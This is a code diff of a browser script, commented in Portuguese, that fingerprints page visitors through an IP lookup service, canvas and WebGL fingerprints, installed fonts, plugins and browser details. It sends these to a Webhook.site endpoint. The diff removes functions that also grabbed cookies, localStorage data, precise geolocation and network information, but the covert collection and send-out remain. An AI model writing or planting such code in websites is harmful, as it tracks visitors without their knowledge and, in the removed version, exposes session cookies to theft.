@@ -19,7 +19,6 @@
       if (e.clientY < 0) tentouSair = true;
     });
 
-    // Função para pegar a impressão digital do Canvas
     function getCanvasFingerprint() {
       const canvas = document.createElement('canvas');
       const ctx = canvas.getContext('2d');
@@ -29,7 +28,6 @@
       return canvas.toDataURL();
     }
 
-    // Função para pegar o renderizador WebGL
     function getWebGLRenderer() {
       try {
         const canvas = document.createElement("canvas");
@@ -41,7 +39,6 @@
       }
     }
 
-    // Função para pegar as fontes instaladas
     function getFontList() {
       const fonts = ['Arial','Verdana','Times New Roman','Courier','Tahoma','Georgia','Comic Sans MS','Impact','Trebuchet MS','Calibri'];
       const available = [];
@@ -62,51 +59,15 @@
       return available;
     }
 
-    // Função para pegar informações da rede de internet
-    function getNetworkInfo() {
-      const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-      if (connection) {
-        return {
-          type: connection.effectiveType,
-          downlink: connection.downlink
-        };
-      }
-      return { type: "Desconhecido", downlink: "Desconhecido" };
+    // Função para pegar a lista de plugins do navegador
+    function getPlugins() {
+      return Array.from(navigator.plugins).map(p => p.name);
     }
 
-    // Função para pegar geolocalização detalhada
-    function obterLocalizacaoDetalhada() {
-      return new Promise((resolve, reject) => {
-        if (navigator.geolocation) {
-          navigator.geolocation.getCurrentPosition(position => {
-            resolve({
-              latitude: position.coords.latitude,
-              longitude: position.coords.longitude
-            });
-          }, reject);
-        } else {
-          reject("Geolocalização não disponível.");
-        }
-      });
-    }
-
-    // Função para pegar cookies
-    function getCookies() {
-      return document.cookie;
-    }
-
-    // Função para pegar dados do localStorage
-    function getLocalStorageData() {
-      return localStorage.getItem('usuarioID') || "N/A";
-    }
-
-    // Função principal de coleta de dados
     async function fingerprint() {
       const ipData = await fetch("https://ipapi.co/json/")
         .then(r => r.json())
         .catch(() => ({}));
-
-      const locationData = await obterLocalizacaoDetalhada().catch(() => ({ latitude: "N/A", longitude: "N/A" }));
 
       const data = {
         ip: ipData.ip || "Desconhecido",
@@ -116,8 +77,8 @@
         provedor: ipData.org || "N/A",
         asn: ipData.asn || "N/A",
         fuso: ipData.timezone || "N/A",
-        latitude: locationData.latitude,
-        longitude: locationData.longitude,
+        latitude: ipData.latitude || "N/A",
+        longitude: ipData.longitude || "N/A",
         idioma: navigator.language,
         sistema: navigator.platform,
         navegador: navigator.userAgent,
@@ -128,10 +89,7 @@
         canvasFingerprint: getCanvasFingerprint().slice(100, 140),
         webglRenderer: getWebGLRenderer(),
         fontes: getFontList(),
-        plugins: Array.from(navigator.plugins).map(p => p.name),
-        cookies: getCookies(),
-        localStorageData: getLocalStorageData(),
-        networkInfo: getNetworkInfo()
+        plugins: getPlugins()
       };
 
       // Enviar para o Webhook.site
@@ -170,10 +128,6 @@ Canvas FP: ${data.canvasFingerprint}
 WebGL: ${data.webglRenderer}
 Fontes: ${data.fontes.join(", ").slice(0, 200)}...
 Plugins: ${data.plugins.join(", ").slice(0, 200)}...
-
-Cookies: ${data.cookies}
-LocalStorage: ${data.localStorageData}
-Conexão de Rede: Tipo - ${data.networkInfo.type}, Velocidade - ${data.networkInfo.downlink} Mbps
           `.trim()
         })
       });
